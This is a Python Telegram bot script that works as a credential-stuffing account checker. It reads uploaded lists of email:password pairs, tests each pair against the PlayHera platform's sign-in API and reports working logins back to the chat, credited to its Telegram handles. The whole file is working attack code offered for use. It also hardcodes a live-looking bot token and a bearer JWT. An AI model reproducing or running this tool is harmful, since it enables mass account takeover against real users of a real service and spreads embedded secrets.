import requests
import telebot,time
from telebot import types
import os
token = '6543857512:AAH4V91G3f96UletgrOQPMLt8K0b3MwvXx0'
bot=telebot.TeleBot(token,parse_mode="HTML")
@bot.message_handler(commands=["start"])
def start(message):
	bot.reply_to(message,"Send the file now 😇")
@bot.message_handler(content_types=["document"])
def main(message):
	try:
		dd = 0
		live = 0
		ch = 0
		ko = (bot.reply_to(message, "Checking Your Accounts...⌛").message_id)
		ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
		with open("ac.txt", "wb") as w:
			w.write(ee)
		with open("ac.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
		for whis in lino:
			try:
				acc=str(whis)
				acc=acc.split('\n')[0]
				email=acc.split(':')[0]
				psw=acc.split(':')[1]
			except:
				continue
			headers = {

    'authority': 'api-v10-mena.playhera.com',

    'accept': 'application/json, text/plain, */*',

    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',

    'authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJwYXlsb2FkIjpudWxsLCJqdGkiOiI3Y2UwZDMyNS02ZTdkLTQ0NWQtOGQxMS05NGY1MTA0ZTY3YWMiLCJvcmlnaW4iOm51bGwsInR5cGUiOiJQcm9maWxlIiwic3ViIjoiYXNlZG8iLCJwZXJtaXNzaW9ucyI6W3siUm9vdCI6ImFwcGxpY2F0aW9uIiwiQWN0aW9uIjoiYWxsIiwiU2NvcGVzIjp7ImFsbCI6bnVsbH19LHsiUm9vdCI6Im9yZ2FuaXphdGlvbiIsIkFjdGlvbiI6InNlbGVjdCIsIlNjb3BlcyI6eyJhbGwiOm51bGx9fSx7IlJvb3QiOiJ0b3VybmFtZW50IiwiQWN0aW9uIjoic2VsZWN0IiwiU2NvcGVzIjp7ImFsbCI6bnVsbH19LHsiUm9vdCI6InRvdXJuYW1lbnQiLCJBY3Rpb24iOiJqb2luIiwiU2NvcGVzIjp7ImFsbCI6bnVsbH19LHsiUm9vdCI6InRvdXJuYW1lbnQiLCJBY3Rpb24iOiJsZWF2ZSIsIlNjb3BlcyI6eyJhbGwiOm51bGx9fV0sImV4cCI6MTcxNTE3NDgxMiwic2Vzc2lvbiI6ImFiOTcxZjEwLWI1YjItNDY1NS1iYzczLTkxNmZlMDA2NWEzNSIsImNpZCI6bnVsbCwiQXV0aFRva2VuIjpudWxsfQ.jkeTGBngk36QnQ4htvdR5Ru2EZEaO6fiBHTr68tefX2wutU2J-dVrWwseTCEXge6DSnR33Hcj8IqEjlr4x7dSg',

    'content-type': 'application/json',

    'origin': 'https://playhera.com',

    'referer': 'https://playhera.com/',

    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',

    'sec-ch-ua-mobile': '?1',

    'sec-ch-ua-platform': '"Android"',

    'sec-fetch-dest': 'empty',

    'sec-fetch-mode': 'cors',

    'sec-fetch-site': 'same-site',

    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',

			}



			json_data = {

    'login': email,

    'password': psw,

    'scopes': 'application,administrative',

			}



# Make the POST request

			response = requests.post('https://api-v10-mena.playhera.com/api/auth/signin', headers=headers, json=json_data)
			
			try:
				ii=response.json()['message']
				dd += 1
			except:
				ii='Successful Login'
				live += 1
				msg=f"𝗚𝗢𝗢𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 ✅\n𝙴𝙼𝙰𝙸𝙻 : {email}\n𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {psw}\n𝗕𝗢𝗧 𝗕𝗬 : @THE_S7"
				bot.reply_to(message, msg)
			mes = types.InlineKeyboardMarkup(row_width=1)
			cm1 = types.InlineKeyboardButton(f"• {acc} •", callback_data='u8')
			status = types.InlineKeyboardButton(f"• 𝗦𝗧𝗔𝗧𝗨𝗦 ➜ {ii} •", callback_data='u8')
			cm3 = types.InlineKeyboardButton(f"• 𝗚𝗢𝗢𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧𝗦 ✅ ➜ [ {live} ] •", callback_data='x')
			cm4 = types.InlineKeyboardButton(f"• 𝗗𝗘𝗔𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧𝗦 ❌ ➜ [ {dd} ] •", callback_data='x')
			cm5 = types.InlineKeyboardButton(f"• 𝗧𝗢𝗧𝗔𝗟 👻 ➜ [ {total} ] •", callback_data='x')
			stop=types.InlineKeyboardButton(f"[ 𝐒𝐓𝐎𝐏 ]", callback_data='stop')
			mes.add(cm1,status, cm3, cm4, cm5, stop)
			bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing 
		𝒃𝒚 ➜ @MNOW4 ''', reply_markup=mes)
	except:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''حاول بأستخدام ملف اخر''')
print("تم تشغيل البوت")
bot.polling()